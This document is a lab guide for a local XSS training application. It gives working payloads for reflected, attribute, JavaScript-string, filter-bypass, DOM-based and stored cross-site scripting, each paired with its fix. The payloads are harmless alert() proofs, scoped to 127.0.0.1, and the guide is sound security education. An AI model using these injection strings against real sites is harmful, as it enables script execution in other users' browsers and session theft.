# XSS lab — one bug class, many contexts

The single most useful thing to internalise about XSS is that **the payload
depends on where your input lands**. Same vulnerability, different escape
sequence. This lab gives you the main contexts on separate routes so you can
drill each one. Base URL: `http://127.0.0.1:8099` — **your own lab only**.

Start at the index: `http://127.0.0.1:8099/xss`.

| Context | Route | VULN | The trick |
|---------|-------|------|-----------|
| HTML text | `/newssearch?q=` | 01 | inject a tag directly |
| HTML attribute | `/profile?name=` | 12 | close the quote, add an event handler |
| JS string | `/greet?msg=` | 13 | close the string, add a statement |
| Filtered | `/filtered?q=` | 14 | dodge a naive blocklist |
| DOM (client-side) | `/welcome#…` | 15 | fragment → `innerHTML` |
| Stored (chat) | `POST /api/chat` | 05 | persists for every visitor |
| Stored (comments) | `POST /api/comments` | 11 | persists on the article page |

> Use `alert(N)` with the VULN number so you can tell which context fired.
> `run_all.py` verifies each of these automatically.

---

## VULN-01 — HTML text context (reflected)
Input lands between tags: `<h2>תוצאות חיפוש עבור: HERE</h2>`.
```
http://127.0.0.1:8099/newssearch?q=<script>alert(1)</script>
http://127.0.0.1:8099/newssearch?q=<img src=x onerror=alert(1)>
```
**Fix:** HTML-escape on output (`html.escape`). Add a CSP.

## VULN-12 — HTML attribute context
Input lands inside a quoted attribute: `<input value="HERE">`. A raw tag won't
run — you must first **break out of the attribute**:
```
http://127.0.0.1:8099/profile?name=" autofocus onfocus=alert(12) x="
```
Renders `<input value="" autofocus onfocus=alert(12) x="">` → fires on focus.
(`" onmouseover=alert(12) x="` works too.)
**Fix:** escape `"` `'` `<` `>` `&` for attribute output; prefer a templating
layer that context-escapes. Quote all attributes.

## VULN-13 — JavaScript string context
Input lands inside inline JS: `<script>var m='HERE';…</script>`. HTML escaping
alone would NOT save you here — you're in a JS string, so **close the string**:
```
http://127.0.0.1:8099/greet?msg=';alert(13);//
```
Renders `var m='';alert(13);//';` → your statement runs.
**Fix:** never build inline script from user input. If unavoidable, JSON-encode
the value (`JSON.stringify`) into the script, or pass it via a `data-` attribute
and read it with `dataset` in external JS. Add CSP (`script-src` without
`unsafe-inline`).

## VULN-14 — Naive filter bypass
A "WAF" strips only the literal lowercase `<script`. Blocklists are
whack-a-mole; go around it:
```
http://127.0.0.1:8099/filtered?q=<img src=x onerror=alert(14)>
http://127.0.0.1:8099/filtered?q=<ScRiPt>alert(14)</ScRiPt>
http://127.0.0.1:8099/filtered?q=<svg onload=alert(14)>
```
**Fix:** don't blocklist. Context-aware output encoding + an allowlist
(sanitiser like DOMPurify for rich text). A filter is not a substitute for
encoding.

## VULN-15 — DOM-based XSS (client-side)
The server never sees the payload — it's after the `#`, read by JS and written
via `innerHTML`:
```
http://127.0.0.1:8099/welcome#<img src=x onerror=alert(15)>
```
Because it's client-side, server-side escaping can't help; this is why you audit
**sinks** (`innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML`,
`eval`, `setTimeout(string)`) and **sources** (`location.hash`/`.search`, `name`,
`referrer`, `postMessage`).
**Fix:** use `textContent`/`.setAttribute` instead of `innerHTML`; sanitise with
DOMPurify if you must render HTML; enable Trusted Types.

## VULN-05 / VULN-11 — Stored XSS
Reflected fires for whoever clicks your link; **stored** fires for *everyone* who
loads the page, no link needed — the higher-impact cousin.
```
curl -s --data-urlencode 'reporter=att' \
        --data-urlencode 'text=<img src=x onerror=alert(5)>' \
        http://127.0.0.1:8099/api/chat        # then load /
curl -s --data-urlencode 'articleId=1001' --data-urlencode 'name=att' \
        --data-urlencode 'text=<img src=x onerror=alert(11)>' \
        http://127.0.0.1:8099/api/comments     # then load /article?id=1001
```
**Fix:** escape on output everywhere the value is rendered; validate/sanitise on
input; CSP as defence-in-depth.

---

## The one-paragraph mental model
Escaping is **context-specific**: HTML-escaping is right for text/attribute
contexts but useless inside a `<script>` or a DOM `innerHTML` sink. Before you
pick a payload, ask *where does my input land?* — then pick the break-out for
that context. Before you pick a fix, ask the same question and encode for that
context (or avoid the dangerous sink entirely). A single CSP without
`unsafe-inline` blunts most of these at once, but it's defence-in-depth, not a
replacement for correct encoding.

## Scope
All of the above targets `127.0.0.1:8099` — the lab. Do not point these at any
site you don't own / aren't authorized in writing to test. See `../SCOPE.md`.
